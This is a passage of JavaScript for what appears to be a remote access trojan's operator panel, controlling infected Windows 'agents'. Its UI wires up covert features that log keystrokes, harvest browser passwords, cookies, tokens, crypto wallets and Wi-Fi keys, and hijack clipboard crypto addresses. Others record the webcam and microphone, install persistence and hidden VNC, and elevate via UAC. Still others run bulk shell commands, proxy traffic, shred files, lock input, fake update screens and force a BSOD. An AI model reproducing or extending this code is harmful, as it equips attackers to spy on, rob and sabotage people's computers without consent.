      S.pending.set(id, { module, label, refreshFiles: true });
      term(label, 'cmd');
    } catch (e) { term(e.message, 'err'); }
  }

  function wireFileOps() {
    $('#fUp')?.addEventListener('click', () => {
      const cur = targetDir();
      const up = parentPath(cur);
      if (!up) loadDrives();
      else openListing(up);
    });

    $('#fUpload')?.addEventListener('click', () => $('#filePicker').click());

    $('#fMkdir')?.addEventListener('click', () => {
      const name = promptName('new folder name');
      if (!name) return;
      const dir = targetDir() || 'C:\\Users\\Public';
      fileOp('mkdir', { path: joinPath(dir, name) }, `mkdir ${joinPath(dir, name)}`);
    });

    $('#fRename')?.addEventListener('click', () => {
      if (!S.fileSel) return toast('select a file first');
      const name = promptName('rename to', S.fileSel.name);
      if (!name || name === S.fileSel.name) return;
      const parent = parentPath(S.fileSel.path) || targetDir();
      const dest = joinPath(parent, name);
      fileOp('mv', { path: S.fileSel.path, dest }, `rename ${S.fileSel.name} -> ${name}`);
      selectFile(null, null);
    });

    $('#fDelete')?.addEventListener('click', () => {
      if (!S.fileSel) return toast('select a file first');
      const entry = S.fileSel;
      if (!confirm(`delete ${entry.dir ? 'folder' : 'file'} ${entry.path}?`)) return;
      fileOp('rm', { path: entry.path, recursive: !!entry.dir }, `delete ${entry.path}`);
      selectFile(null, null);
    });
  }

  // ------------------------------------------------------------------
  // transfers
  // ------------------------------------------------------------------
  function renderTransfers(files) {
    const box = $('#xferList');
    const rows = files.map((f) => `
      <div class="xrow">
        <span class="kd">${esc(f.kind || 'file')}</span>
        <span class="nm" title="${esc(f.path || f.name)}">${esc(f.name)}</span>
        <span class="sz">${bytes(f.size)}</span>
        <a class="btn" href="/api/files/${f.id}" target="_blank" rel="noopener">open</a>
      </div>`).join('');
    box.dataset.files = JSON.stringify(files);
    box.innerHTML = rows || '<div class="node"><span class="nm">no transfers yet</span></div>';
  }

  function addTransfer(detail) {
    const box = $('#xferList');
    let row = box.querySelector(`[data-xid="${detail.id}"]`);
    if (!row) {
      row = document.createElement('div');
      row.className = 'xrow';
      row.dataset.xid = detail.id;
      row.innerHTML = `<span class="kd">${esc(detail.kind || 'transfer')}</span>
        <span class="nm">${esc(detail.name || 'transfer')}</span>
        <span class="bar"><i></i></span>
        <span class="sz">0%</span>`;
      box.prepend(row);
    }
    row.querySelector('.bar i').style.width = (detail.pct || 0) + '%';
    row.querySelector('.sz').textContent = (detail.pct || 0) + '%';
  }

  // ------------------------------------------------------------------
  // keylog / media
  // ------------------------------------------------------------------
  function renderKeylog(logs) {
    $('#keyOut').textContent = logs.map((l) => l.text).join('');
    const pre = $('#keyOut');
    pre.scrollTop = pre.scrollHeight;
  }

  function appendKeylog(text) {
    const pre = $('#keyOut');
    pre.textContent += text;
    if (pre.textContent.length > 400000) pre.textContent = pre.textContent.slice(-300000);
    pre.scrollTop = pre.scrollHeight;
  }

  function showFile(f) {
    if (!f) return;
    if (f.kind === 'audio') {
      $('#audioWrap').innerHTML = `<audio controls autoplay src="/api/files/${f.id}"></audio>`;
      switchPane('media');
    } else if (f.kind === 'screenshot') {
      $('#lightboxImg').src = '/api/files/' + f.id;
      $('#lightbox').classList.remove('hidden');
      switchPane('screen');
    }
  }

  // ------------------------------------------------------------------
  // toolbar
  // ------------------------------------------------------------------
  function wireToolbar() {
    $$('.tbtn[data-tool]').forEach((b) => b.addEventListener('click', async () => {
      const t = b.dataset.tool;
      if (t === 'filter') { S.onlineOnly = !S.onlineOnly; b.classList.toggle('active', S.onlineOnly); render(); }
      if (t === 'sort') {
        S.sort = S.sort === 'host' ? 'online' : S.sort === 'online' ? 'ping' : 'host';
        toast('sort: ' + S.sort); render();
      }
      if (t === 'groups') { openGroupManager(); return; }
      if (t === 'select') { applyFilter(S.agents).forEach((a) => S.selection.add(a.id)); render(); }
      if (t === 'clear') { S.selection.clear(); render(); }
      if (t === 'list') { S.view = 'list'; $('#board').classList.add('list'); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.remove('active')); }
      if (t === 'grid') { S.view = 'grid'; $('#board').classList.remove('list'); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.remove('active')); }
      if (t === 'power') {
        const ids = S.selection.size ? [...S.selection] : (S.sel ? [S.sel] : []);
        if (!ids.length) return toast('select an agent first');
        if (!confirm(`terminate ${ids.length} agent(s)?`)) return;
        for (const id of ids) {
          try {
            await api(`/api/agents/${encodeURIComponent(id)}/cmd`, {
              method: 'POST', headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ module: 'exit', args: {} }),
            });
          } catch {}
        }
        toast('terminate sent');
      }
    }));

    $('#q').addEventListener('input', render);
    $('#groupBar').addEventListener('click', (e) => {
      const b = e.target.closest('[data-grp]');
      if (!b) return;
      S.group = b.dataset.grp;
      renderGroupBar();
      render();
    });
    $('#mClose').addEventListener('click', closeModal);
    $('#modal').addEventListener('click', (e) => { if (e.target.id === 'modal') closeModal(); });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        $('#lightbox').classList.add('hidden');
        if (!$('#groupModal').classList.contains('hidden')) closeGroupManager();
        else if (!$('#clientModal').classList.contains('hidden')) closeClientEditor();
        else if (!$('#modal').classList.contains('hidden')) closeModal();
      }
    });
    $('#lightbox').addEventListener('click', () => $('#lightbox').classList.add('hidden'));
  }

  function toggleSelect(id) {
    if (S.selection.has(id)) S.selection.delete(id);
    else S.selection.add(id);
    render();
  }

  function wireGrid() {
    $('#board').addEventListener('click', (e) => {
      const head = e.target.closest('.ghead');
      if (head) {
        const sec = head.closest('.gsec');
        if (!sec) return;
        const key = sec.dataset.grp;
        if (S.collapsed.has(key)) S.collapsed.delete(key);
        else S.collapsed.add(key);
        sec.classList.toggle('collapsed', S.collapsed.has(key));
        return;
      }
      const card = e.target.closest('.card');
      if (!card) return;
      const id = card.dataset.id;
      const act = e.target.closest('[data-act]')?.dataset.act;

      if (act === 'pick') return toggleSelect(id);
      if (act === 'open') return openAgent(id);
      if (act === 'screen') { openAgent(id).then(() => switchPane('screen')); return; }
      if (act === 'mic') {
        openAgent(id).then(() => {
          switchPane('media');
          run('mic', { seconds: 10 }, 'recording microphone 10s');
        });
        return;
      }
      if (act === 'pin') {
        const a = agentById(id);
        patchMeta(id, { pinned: !(a && a.pinned) });
        return;
      }
      if (act === 'kill') {
        if (!confirm('terminate ' + (agentById(id)?.host || id) + '?')) return;
        api(`/api/agents/${encodeURIComponent(id)}/cmd`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ module: 'exit', args: {} }),
        }).then(() => toast('terminate sent')).catch((err) => toast(err.message));
        return;
      }
      if (act === 'menu') { openClientEditor(id); return; }

      if (e.ctrlKey || e.metaKey || e.shiftKey) toggleSelect(id);
      else openAgent(id);
    });
  }

  // ------------------------------------------------------------------
  // modal wiring
  // ------------------------------------------------------------------
  function quickButtons() {
    const items = [
      ['sysinfo', 'sysinfo'], ['ps', 'processes'], ['drives', 'drives'],
      ['keylog start', 'keylog', { action: 'start' }],
      ['persist', 'persist', { action: 'install' }],
      ['services', 'services', { action: 'list' }],
      ['wifi', 'wifi', { action: 'profiles' }],
      ['software', 'software'], ['startup', 'startup'], ['net', 'net'],
      ['clipboard', 'clipboard', { action: 'get' }],
      ['harvest all', 'creds', { action: 'all' }],
      ['webcam', 'webcam', {}],
      ['netscan', 'netscan', {}],
      ['socks5 start', 'socks', { action: 'start', port: 1080 }],
      ['hosts get', 'hosts', { action: 'get' }],
      ['hvnc start', 'hvnc', { action: 'start' }],
    ];
    $('#quick').innerHTML = items
      .map(([label], i) => `<button class="qbtn" data-q="${i}">${esc(label)}</button>`).join('');
    $('#quick').onclick = (e) => {
      const b = e.target.closest('[data-q]');
      if (!b) return;
      const [label, mod, args] = items[+b.dataset.q];
      run(mod, args || {}, label);
    };

    const sys = [
      ['lock', 'power', { action: 'lock' }],
      ['reboot', 'power', { action: 'reboot' }],
      ['shutdown', 'power', { action: 'shutdown' }],
      ['volume +', 'volume', { action: 'up', steps: 5 }],
      ['volume -', 'volume', { action: 'down', steps: 5 }],
      ['mute', 'volume', { action: 'mute' }],
      ['say', 'say', { text: 'hello from the other side' }],
      ['popup', 'msgbox', { title: 'Windows', text: 'system maintenance' }],
      ['search *.txt', 'search', { path: 'C:\\Users', pattern: '*.txt', max: 200 }],
      ['registry HKCU Run', 'registry', { action: 'get', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' }],
      ['flip display', 'flip', { rotation: '180' }],
      ['hide taskbar', 'shellui', { action: 'hide', what: 'all' }],
      ['show taskbar', 'shellui', { action: 'show', what: 'all' }],
      ['blackout', 'overlay', { action: 'blackout' }],
      ['fake update', 'overlay', { action: 'update' }],
      ['lock input', 'inputlock', { action: 'on' }],
      ['unlock input', 'inputlock', { action: 'off' }],
      ['cd tray', 'cdtray', { action: 'open' }],
      ['bsod', 'bsod', {}],
    ];
    $('#sysQuick').innerHTML = sys
      .map(([label], i) => `<button class="qbtn" data-s="${i}">${esc(label)}</button>`).join('');
    $('#sysQuick').onclick = (e) => {
      const b = e.target.closest('[data-s]');
      if (!b) return;
      const [label, mod, args] = sys[+b.dataset.s];
      run(mod, args, label);
    };
  }

  function openClientEditor(id) {
    const a = agentById(id);
    if (!a) return;
    S.editing = id;
    $('#ceWho').textContent = [a.host, a.user, a.id.slice(0, 8)].filter(Boolean).join(' · ');
    $('#ceNick').value = a.nickname || '';
    $('#ceGrp').value = a.grp || '';
    $('#ceNote').value = a.note || '';
    $('#cePin').checked = !!a.pinned;
    const groups = [...new Set([
      ...S.groups.map((g) => g.name),
      ...S.agents.map((x) => x.grp).filter(Boolean),
    ])];
    $('#ceGrpList').innerHTML = groups.map((g) => `<option value="${esc(g)}">`).join('');
    $('#clientModal').classList.remove('hidden');
    $('#ceNick').focus();
  }

  function closeClientEditor() {
    $('#clientModal').classList.add('hidden');
    S.editing = null;
  }

  async function saveClientEditor() {
    if (!S.editing) return;
    const fields = {
      nickname: $('#ceNick').value.trim(),
      grp: $('#ceGrp').value.trim(),
      note: $('#ceNote').value.trim(),
      pinned: $('#cePin').checked,
    };
    await patchMeta(S.editing, fields);
    closeClientEditor();
    toast('client updated');
  }

  function wireClientEditor() {
    $('#ceClose').addEventListener('click', closeClientEditor);
    $('#ceCancel').addEventListener('click', closeClientEditor);
    $('#ceSave').addEventListener('click', saveClientEditor);
    $('#clientModal').addEventListener('click', (e) => { if (e.target.id === 'clientModal') closeClientEditor(); });
    $('#ceNick').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); saveClientEditor(); } });
  }

  // ------------------------------------------------------------------
  // group manager + bulk actions
  // ------------------------------------------------------------------
  function renderGroups() {
    const list = $('#gmList');
    if (!list) return;
    if (!S.groups.length) {
      list.innerHTML = '<div class="gmempty">no groups yet — create one above</div>';
      return;
    }
    list.innerHTML = S.groups.map((g) => `
      <div class="gmrow" data-g="${esc(g.name)}">
        <input type="color" class="gmcolor" value="${esc(g.color)}" title="color">
        <span class="gmname">${esc(g.name)}</span>
        <span class="gmcount">${g.online || 0}/${g.count || 0}</span>
        <button class="btn small" data-gm="filter">show</button>
        <button class="btn small" data-gm="rename">rename</button>
        <button class="btn small danger" data-gm="delete">delete</button>
      </div>`).join('');
  }

  function openGroupManager() {
    renderGroups();
    $('#groupModal').classList.remove('hidden');
    $('#gmName').focus();
  }

  function closeGroupManager() {
    $('#groupModal').classList.add('hidden');
  }

  async function groupCall(path, method, body) {
    try {
      const r = await api(path, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: body === undefined ? undefined : JSON.stringify(body),
      });
      if (r && r.groups) syncGroups(r.groups);
      return r;
    } catch (e) { toast(e.message); return null; }
  }

  async function createGroup() {
    const name = $('#gmName').value.trim();
    if (!name) return toast('group name required');
    const color = $('#gmColor').value || '#6366f1';
    const r = await groupCall('/api/groups', 'POST', { name, color });
    if (r) {
      $('#gmName').value = '';
      toast('group created');
    }
  }

  function wireGroupManager() {
    $('#gmClose').addEventListener('click', closeGroupManager);
    $('#groupModal').addEventListener('click', (e) => {
      if (e.target.id === 'groupModal') closeGroupManager();
    });
    $('#gmAdd').addEventListener('click', createGroup);
    $('#gmName').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); createGroup(); }
    });

    $('#gmList').addEventListener('click', async (e) => {
      const row = e.target.closest('.gmrow');
      if (!row) return;
      const name = row.dataset.g;
      const act = e.target.closest('[data-gm]')?.dataset.gm;
      if (!act) return;
      if (act === 'filter') {
        S.group = name;
        closeGroupManager();
        renderGroupBar();
        render();
      }
      if (act === 'rename') {
        const next = promptName(`rename group "${name}"`, name);
        if (!next || next === name) return;
        await groupCall(`/api/groups/${encodeURIComponent(name)}`, 'PATCH', { name: next });
        if (S.group === name) S.group = next;
        renderGroupBar();
        render();
      }
      if (act === 'delete') {
        if (!confirm(`delete group "${name}"? members become ungrouped`)) return;
        await groupCall(`/api/groups/${encodeURIComponent(name)}`, 'DELETE');
        if (S.group === name) S.group = '';
        renderGroupBar();
        render();
      }
    });

    $('#gmList').addEventListener('change', async (e) => {
      const row = e.target.closest('.gmrow');
      const color = e.target.closest('.gmcolor');
      if (!row || !color) return;
      await groupCall(`/api/groups/${encodeURIComponent(row.dataset.g)}`, 'PATCH',
        { color: color.value });
    });
  }

  function wireBulk() {
    const bar = $('#bulkBar');
    if (!bar) return;
    bar.addEventListener('click', async (e) => {
      const act = e.target.closest('[data-bulk]')?.dataset.bulk;
      if (!act) return;
      const ids = [...S.selection];
      if (act === 'clear') { S.selection.clear(); render(); return; }
      if (!ids.length) return toast('nothing selected');

      const body = { ids };
      if (act === 'assign') {
        const grp = $('#bulkGrp').value.trim();
        if (!grp) return toast('type a group name');
        body.grp = grp;
      }
      if (act === 'ungroup') body.grp = '';
      if (act === 'pin') body.pinned = true;
      if (act === 'unpin') body.pinned = false;
      if (act === 'cmd') {
        const cmd = prompt(`shell command for ${ids.length} agent(s)`);
        if (!cmd || !cmd.trim()) return;
        body.action = 'cmd';
        body.module = 'shell';
        body.args = { cmd: cmd.trim() };
      }
      if (act === 'exit') {
        if (!confirm(`terminate ${ids.length} agent(s)?`)) return;
        body.action = 'exit';
      }
      if (act === 'purge') {
        if (!confirm(`purge ${ids.length} agent(s) and all their data?`)) return;
        body.action = 'purge';
      }

      try {
        await api('/api/bulk', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        });
        toast(act === 'assign' || act === 'ungroup' ? 'group updated' : 'sent');
        if (act === 'purge') S.selection.clear();
        await loadState();
      } catch (err) { toast(err.message); }
    });
  }

  function wireScreenControls() {
    const wrap = $('#screenWrap');
    if (!wrap) return;

    wrap.addEventListener('mousedown', (e) => {
      if (!S.control) { toast('turn control on first'); return; }
      if (e.button > 2) return;
      e.preventDefault();
      wrap.focus();
      const p = screenPoint(e);
      if (!p) return;
      S.downBtn = e.button === 2 ? 'right' : e.button === 1 ? 'middle' : 'left';
      sendCtl('input', { action: 'down', button: S.downBtn, ...p });
    });

    document.addEventListener('mouseup', () => {
      if (!S.downBtn) return;
      sendCtl('input', { action: 'up', button: S.downBtn });
      S.downBtn = null;
    });

    wrap.addEventListener('mousemove', (e) => {
      if (!S.control || !S.downBtn) return;
      const now = Date.now();
      if (now - S.lastMove < 50) return;
      S.lastMove = now;
      const p = screenPoint(e);
      if (p) sendCtl('input', { action: 'move', ...p });
    });

    wrap.addEventListener('contextmenu', (e) => e.preventDefault());

    wrap.addEventListener('wheel', (e) => {
      if (!S.control) return;
      e.preventDefault();
      const p = screenPoint(e);
      sendCtl('input', {
        action: 'scroll',
        delta: e.deltaY < 0 ? 120 : -120,
        ...(p || {}),
      });
    }, { passive: false });

    wrap.addEventListener('keydown', (e) => {
      if (!S.control) return;
      if (['Tab', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', ' '].includes(e.key))
        e.preventDefault();
      if (e.repeat) return;
      sendCtl('input', { action: 'key', vk: e.keyCode, down: true });
    });

    wrap.addEventListener('keyup', (e) => {
      if (!S.control) return;
      sendCtl('input', { action: 'key', vk: e.keyCode, down: false });
    });

    $$('.kbtn').forEach((b) => b.addEventListener('click', (e) => {
      e.preventDefault();
      if (!S.control) { toast('turn control on first'); return; }
      const keys = (b.dataset.combo || '').split(',').map(Number).filter(Boolean);
      if (keys.length) sendCtl('input', { action: 'hotkey', keys });
      wrap.focus();
    }));

    $('#typeForm').addEventListener('submit', (e) => {
      e.preventDefault();
      const text = $('#typeInput').value;
      if (!text) return;
      if (!S.control) { toast('turn control on first'); return; }
      sendCtl('input', { action: 'type', text });
      $('#typeInput').value = '';
      wrap.focus();
    });

    window.addEventListener('blur', () => {
      if (S.downBtn) {
        sendCtl('input', { action: 'up', button: S.downBtn });
        S.downBtn = null;
      }
    });
  }

  function screenPoint(ev) {
    const img = $('#screenImg');
    const r = img ? img.getBoundingClientRect() : null;
    if (!r || !r.width || !r.height) return null;
    const nw = img.naturalWidth || r.width;
    const nh = img.naturalHeight || r.height;
    const scale = Math.min(r.width / nw, r.height / nh);
    const w = nw * scale, h = nh * scale;
    const left = r.left + (r.width - w) / 2;
    const top = r.top + (r.height - h) / 2;
    const nx = Math.min(1, Math.max(0, (ev.clientX - left) / w));
    const ny = Math.min(1, Math.max(0, (ev.clientY - top) / h));
    return { nx: Math.round(nx * 10000), ny: Math.round(ny * 10000) };
  }

  function wireModal() {
    $$('.rtab').forEach((t) => t.addEventListener('click', () => {
      switchPane(t.dataset.pane);
      if (t.dataset.pane === 'xfer') refreshDetail();
    }));

    $('#cmdForm').addEventListener('submit', (e) => {
      e.preventDefault();
      const cmd = $('#cmdInput').value.trim();
      if (!cmd || !S.sel) return;
      S.history.push(cmd); S.hIndex = S.history.length;
      $('#cmdInput').value = '';
      run('shell', { cmd, shell: $('#shell').value }, null);
    });
    $('#cmdInput').addEventListener('keydown', (e) => {
      if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (!S.history.length) return;
        S.hIndex = Math.max(0, S.hIndex - 1);
        $('#cmdInput').value = S.history[S.hIndex] || '';
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        S.hIndex = Math.min(S.history.length, S.hIndex + 1);
        $('#cmdInput').value = S.history[S.hIndex] || '';
      }
    });

    $('#fGo').addEventListener('click', () => {
      const p = $('#fPath').value.trim();
      if (!p || !S.sel) return;
      openListing(p);
    });
    $('#fPath').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); $('#fGo').click(); } });
    $('#fHome').addEventListener('click', () => { setCwd(''); loadDrives(); });
    $('#fRefresh').addEventListener('click', () => {
      const p = targetDir();
      if (p) openListing(p); else loadDrives();
    });

    $('#modal').addEventListener('click', (e) => {
      const act = e.target.closest('[data-act]')?.dataset.act;
      if (!act) return;
      if (act === 'screenshot') run('screenshot', {}, 'capture');
      if (act === 'control-toggle') {
        setControl(!S.control);
      }
      if (act === 'preview-pause') {
        const btn = e.target.closest('[data-act]');
        const paused = btn.dataset.paused === '1';
        btn.dataset.paused = paused ? '0' : '1';
        btn.textContent = paused ? 'pause stream' : 'resume stream';
        run('preview', { action: paused ? 'resume' : 'pause' },
            paused ? 'resume preview' : 'pause preview');
      }
      if (act === 'mic') run('mic', { seconds: +$('#micSecs').value || 10 }, 'record mic');
      if (act === 'clip-get') run('clipboard', { action: 'get' }, 'clipboard read');
      if (act === 'clip-set') {
        const text = prompt('clipboard text');
        if (text) run('clipboard', { action: 'set', text }, 'clipboard write');
      }
      if (act === 'say') {
        const text = prompt('say what?', 'hello');
        if (text) run('say', { text }, 'speak');
      }
      if (act === 'msgbox') {
        const text = prompt('message text', 'maintenance');
        if (text) run('msgbox', { title: 'Windows', text }, 'popup');
      }
      if (act === 'vol-mute') run('volume', { action: 'mute' }, 'mute');
      if (act === 'key-start') run('keylog', { action: 'start' }, 'keylog on');
      if (act === 'key-stop') run('keylog', { action: 'stop' }, 'keylog off');
      if (act === 'key-dump') run('keylog', { action: 'dump' }, 'keylog dump');
      if (act === 'key-clear') {
        $('#keyOut').textContent = '';
        if (S.sel) {
          api(`/api/agents/${encodeURIComponent(S.sel)}/keylogs`, { method: 'DELETE' })
            .then(() => toast('keylog cleared'))
            .catch(() => {});
        }
        run('keylog', { action: 'clear' }, 'keylog clear');
      }

      // ---- input lock + overlay --------------------------------------
      if (act === 'input-lock') run('inputlock', { action: 'on' }, 'lock user input');
      if (act === 'input-unlock') run('inputlock', { action: 'off' }, 'restore user input');
      if (act === 'overlay-blackout') run('overlay', { action: 'blackout' }, 'blackout screen');
      if (act === 'overlay-update') run('overlay', { action: 'update' }, 'fake update screen');
      if (act === 'overlay-off') run('overlay', { action: 'off' }, 'close overlay');

      // ---- spy --------------------------------------------------------
      if (act === 'webcam') run('webcam', { index: +$('#camIndex').value || 0 }, 'webcam capture');
      if (act === 'clipper-start') run('clipper', { action: 'start' }, 'clipper on');
      if (act === 'clipper-stop') run('clipper', { action: 'stop' }, 'clipper off');
      if (act === 'clipper-status') run('clipper', { action: 'status' }, 'clipper status');
      if (act === 'clipper-set') run('clipper', {
        action: 'set', coin: $('#clCoin').value, address: $('#clAddr').value.trim(),
      }, 'clipper set address');
      if (act === 'creds-browsers') run('creds', { action: 'browsers' }, 'harvest passwords');
      if (act === 'creds-cookies') run('creds', { action: 'cookies' }, 'harvest cookies');
      if (act === 'creds-tokens') run('creds', { action: 'tokens' }, 'harvest tokens');
      if (act === 'creds-wallets') run('creds', { action: 'wallets' }, 'harvest wallets');
      if (act === 'creds-keys') run('creds', { action: 'keys' }, 'read product keys');
      if (act === 'creds-all') run('creds', { action: 'all' }, 'harvest everything');

      // ---- network ----------------------------------------------------
      if (act === 'netscan') run('netscan', {
        arp_only: $('#nsArp').checked, ports: $('#nsPorts').value.trim(),
      }, 'scan network');
      if (act === 'socks-start') run('socks', { action: 'start', port: +$('#socksPort').value || 1080 }, 'socks5 start');
      if (act === 'socks-stop') run('socks', { action: 'stop' }, 'socks5 stop');
      if (act === 'socks-status') run('socks', { action: 'status' }, 'socks5 status');
      if (act === 'hosts-get') run('hosts', { action: 'get' }, 'read hosts');
      if (act === 'hosts-backup') run('hosts', { action: 'backup' }, 'backup hosts');
      if (act === 'hosts-restore') run('hosts', { action: 'restore' }, 'restore hosts');
      if (act === 'hosts-add') run('hosts', {
        action: 'add', ip: $('#hostsIp').value.trim() || '0.0.0.0', host: $('#hostsHost').value.trim(),
      }, 'add hosts entry');
      if (act === 'hosts-remove') run('hosts', {
        action: 'remove', host: $('#hostsHost').value.trim(),
      }, 'remove hosts entry');

      // ---- desktop ----------------------------------------------------
      if (act === 'flip-180') run('flip', { rotation: '180' }, 'flip display 180');
      if (act === 'flip-90') run('flip', { rotation: '90' }, 'rotate display 90');
      if (act === 'flip-0') run('flip', { rotation: '0' }, 'reset display');
      if (act === 'shellui-hide') run('shellui', { action: 'hide', what: 'all' }, 'hide icons + taskbar');
      if (act === 'shellui-show') run('shellui', { action: 'show', what: 'all' }, 'show icons + taskbar');
      if (act === 'cdtray-open') run('cdtray', { action: 'open' }, 'open cd tray');
      if (act === 'cdtray-close') run('cdtray', { action: 'close' }, 'close cd tray');

      // ---- misc -------------------------------------------------------
      if (act === 'openurl') run('openurl', { url: $('#openUrl').value.trim() }, 'open url');
      if (act === 'shred') run('shred', { path: $('#shredPath').value.trim() }, 'shred path');
      if (act === 'uac') run('uac', { command: $('#uacCmd').value.trim() }, 'elevate via uac');
      if (act === 'update') run('update', { url: $('#updUrl').value.trim() }, 'self update');
      if (act === 'bsod') {
        if (confirm('trigger a real bugcheck (BSOD) on this machine?')) run('bsod', {}, 'trigger bsod');
      }

      // ---- hidden desktop --------------------------------------------
      if (act === 'hvnc-start') run('hvnc', { action: 'start' }, 'hvnc start');
      if (act === 'hvnc-launch') run('hvnc', { action: 'launch', path: 'cmd.exe' }, 'hvnc launch cmd');
      if (act === 'hvnc-list') run('hvnc', { action: 'list' }, 'hvnc list');
      if (act === 'hvnc-capture') run('hvnc', { action: 'capture', index: 0 }, 'hvnc capture');
      if (act === 'hvnc-close') run('hvnc', { action: 'close' }, 'hvnc close');

      // ---- new utilities ---------------------------------------------
      if (act === 'env-dump') run('env', { filter: $('#envFilter').value.trim() }, 'environment');
      if (act === 'wall-set') run('wallpaper', {
        action: 'set', path: $('#wallPath').value.trim(),
        style: $('#wallStyle').value,
      }, 'set wallpaper');
      if (act === 'wall-get') run('wallpaper', { action: 'get' }, 'read wallpaper');
      if (act === 'wall-clear') run('wallpaper', { action: 'clear' }, 'clear wallpaper');
      if (act === 'wifi-profiles') run('wifi', { action: 'profiles' }, 'wifi profiles');
      if (act === 'wifi-passwords') run('wifi', { action: 'allpasswords' }, 'wifi passwords');
      if (act === 'wifi-password') run('wifi', {
        action: 'password', name: $('#wifiSsid').value.trim(),
      }, 'wifi password');
      if (act === 'wol') run('wol', {
        mac: $('#wolMac').value.trim(), broadcast: $('#wolBcast').value.trim(),
      }, 'wake-on-lan');
    });

    ['#pvFps', '#pvQuality', '#pvWidth', '#pvMonitor'].forEach((sel) => {
      const el = $(sel);
      if (el) el.addEventListener('change', () => { if (S.inPreview) sendSilent('preview', previewOpts()); });
    });

    wireScreenControls();

    $('#filePicker').addEventListener('change', async (ev) => {
      const file = ev.target.files[0];
      ev.target.value = '';
      if (!file || !S.sel) return;
      const dir = targetDir() || 'C:\\Users\\Public';
      const name = prompt('remote filename', file.name);
      if (!name) return;
      const remote = joinPath(dir, name);
      const fd = new FormData();
      fd.append('path', remote);
      fd.append('file', file);
      term(`upload ${file.name} -> ${remote}`, 'cmd');
      try {
        const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/upload`, { method: 'POST', body: fd });
        term(`queued ${r.chunks} chunk(s) · ${bytes(r.size)}`, 'sys');
        // chunks drain in order, so give the agent a moment then re-list
        setTimeout(() => {
          const cur = targetDir();
          if (cur) openListing(cur); else loadDrives();
        }, 600 + r.chunks * 120);
      } catch (e) { term(e.message, 'err'); }
    });
  }

  async function refreshDetail() {
    if (!S.sel) return;
    try {
      const d = await api('/api/agents/' + encodeURIComponent(S.sel));
      renderTransfers(d.files || []);
    } catch {}
  }

  // ------------------------------------------------------------------
  // live frames: [1 byte id-len][id][jpeg]
  // ------------------------------------------------------------------
  const decoder = new TextDecoder();

  function handleBinaryFrame(buf) {
    const b = new Uint8Array(buf);
    if (b.length < 4) return;
    const idLen = b[0];
    if (!idLen || b.length <= idLen + 2) return;
    const id = decoder.decode(b.subarray(1, 1 + idLen));
    const jpeg = b.subarray(1 + idLen);
    applyFrame(id, new Blob([jpeg], { type: 'image/jpeg' }));
  }

  function applyFrame(id, blob) {
    const a = S.agents.find((x) => x.id === id);
    if (a) { a.online = true; a.has_preview = true; a.frame = (a.frame || 0) + 1; }

    const el = S.els.get(id);
    const img = el?.querySelector('.thumb img');
    const onScreen = id === S.sel && $('#pane-screen').classList.contains('active');

    if (img) {
      const url = URL.createObjectURL(blob);
      const old = S.thumbs[id];
      img.src = url;
      S.thumbs[id] = url;
      if (old) URL.revokeObjectURL(old);
      el.querySelector('.ghost')?.remove();
    }

    if (onScreen) {
      const url = URL.createObjectURL(blob);
      const prev = S.screenUrl;
      $('#screenImg').src = url;
      S.screenUrl = url;
      $('#screenEmpty').classList.add('hidden');
      if (prev) URL.revokeObjectURL(prev);
    }
  }

  // ------------------------------------------------------------------
  // websocket
  // ------------------------------------------------------------------
  let refreshTimer = null;
  function scheduleRefresh() {
    clearTimeout(refreshTimer);
    refreshTimer = setTimeout(loadState, 180);
  }

  function connect() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${proto}//${location.host}/panel/ws`);
    S.ws = ws;

    ws.onmessage = (ev) => {
      if (ev.data instanceof Blob) {
        ev.data.arrayBuffer().then(handleBinaryFrame).catch(() => {});
        return;
      }
      let m;
      try { m = JSON.parse(ev.data); } catch { return; }

      if (m.t === 'groups') { syncGroups(m.groups); return; }
      if (m.t === 'refresh') { scheduleRefresh(); return; }

      if (m.t === 'agent') {
        const a = m.agent;
        if (a.removed) {
          S.agents = S.agents.filter((x) => x.id !== a.id);
          S.selection.delete(a.id);
          if (S.sel === a.id) closeModal();
          render();
          return;
        }
        const idx = S.agents.findIndex((x) => x.id === a.id);
        if (idx >= 0) S.agents[idx] = { ...S.agents[idx], ...a };
        else S.agents.push(a);
        render();
        if (a.id === S.sel) {
          const label = a.nickname || a.host || 'unknown';
          if ($('#mHost').textContent !== label) $('#mHost').textContent = label;
        }
        return;
      }

      if (m.t === 'ping') {
        const a = S.agents.find((x) => x.id === m.agent_id);
        if (a) a.ping = m.ms;
        if (m.agent_id === S.sel) $('#mPing').textContent = fmtPing(m.ms);
        const el = S.els.get(m.agent_id);
        const ping = el?.querySelector('.ping');
        if (ping) {
          ping.className = 'ping ' + pingClass(m.ms);
          ping.innerHTML = ICON.mouse + fmtPing(m.ms);
        }
        return;
      }

      if (m.agent_id && m.agent_id !== S.sel) return;

      if (m.t === 'result') {
        const p = S.pending.get(m.cmd_id);
        S.pending.delete(m.cmd_id);

        if (p?.module === 'ls') {
          const meta = m.body?.meta;
          if (p.target && meta?.entries) {
            renderListing(p.target, meta.entries);
            if (p.target.id === 'ftree' && meta.path) setCwd(meta.path);
          }
          return;
        }
        if (p?.module === 'drives') {
          renderDrives(m.body?.meta?.drives);
          return;
        }
        if (p?.module === 'upload') return;
        if (p?.refreshFiles) {
          setTimeout(() => {
            const cur = targetDir();
            if (cur) openListing(cur); else loadDrives();
          }, 500);
        }
        const mod = p?.module || m.module;
